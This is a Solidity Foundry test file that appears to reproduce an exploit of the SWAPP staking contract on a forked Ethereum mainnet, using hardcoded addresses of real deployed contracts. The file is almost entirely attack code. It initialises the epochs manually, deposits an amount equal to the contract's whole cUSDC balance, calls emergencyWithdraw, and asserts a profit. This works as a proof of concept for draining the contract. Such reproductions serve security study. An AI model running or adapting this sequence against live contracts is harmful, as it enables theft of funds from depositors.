// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

contract SWAPPStaking_Ex is BaseTestWithBalanceLog {
    Staking constant staking = Staking(0x245a551ee0F55005e510B239c917fA34b41B3461);
    CErc20 constant cUSDC = CErc20(0x39AA39c021dfbaE8faC545936693aC917d5E7563);

    uint256 private constant forkBlockNumber = 22_957_533 - 1; 

    function setUp() public {
        string memory rpcUrl = vm.envString("RPC_URL"); // ETH
        vm.createSelectFork(rpcUrl, forkBlockNumber);
        fundingToken = address(cUSDC);
    }

    function testExploit() public {
        exploit();
    }

    function exploit() public balanceLog() {
        init_epochs(); // Init epochs to complete `deposit`
        assert(staking.epochIsInitialized(address(cUSDC), 0));
        cUSDC.approve(address(staking), type(uint256).max);
        uint256 staking_cUSDC_balance = cUSDC.balanceOf(address(staking));
        staking.deposit(address(cUSDC), staking_cUSDC_balance, address(0x0));
        staking.emergencyWithdraw(address(cUSDC));
        cUSDC.transfer(address(this), staking_cUSDC_balance);
        assert(cUSDC.balanceOf(address(this)) > 0);
    }

    function init_epochs() internal {
        address[] memory tokens = new address[](1);
        tokens[0] = address(cUSDC);
        uint128 currentEpoch = staking.getCurrentEpoch();
        for (uint128 i = 0; i < currentEpoch; i++) {
            staking.manualEpochInit(tokens, i);
        }
    }

    receive() external payable {}
}

interface CErc20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
}

interface Staking {
    function balanceOf(address user, address token) external view returns (uint256);
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function emergencyWithdraw(address tokenAddress) external;
    function epochIsInitialized(address token, uint128 epochId) external view returns (bool);
    function getCurrentEpoch() external view returns (uint128);
    function manualEpochInit(address[] memory tokens, uint128 epochId) external;
}